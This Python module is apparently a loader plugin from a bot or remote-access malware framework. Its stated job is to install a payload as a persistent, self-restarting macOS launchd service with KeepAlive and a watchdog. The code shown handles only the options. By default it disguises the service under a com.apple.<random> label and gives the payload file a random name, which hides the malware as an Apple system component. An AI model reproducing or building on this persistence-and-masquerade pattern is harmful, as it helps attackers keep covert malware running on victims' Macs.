# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from bot.loaders.helper import *


class Loader(LoaderABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Run a payload as a resilient launchd service (KeepAlive + watchdog).",
            "References": []
        }

    def get_option_messages(self):
        return [
            "Service label (Leave empty for com.apple.<RANDOM>): ",
            "Payload filename (Leave empty for <RANDOM>): "
        ]

    def get_options(self, set_options):
        set_options = list(set_options) + ["", ""]
        service_label = set_options[0]
        payload_filename = set_options[1]

        if not service_label:
            service_label = "com.apple.{}".format(random_string())

        if not payload_filename:
            payload_filename = random_string()

        return {
            "loader_name": "start_service",
            "service_label": service_label,
            "payload_filename": payload_filename
        }
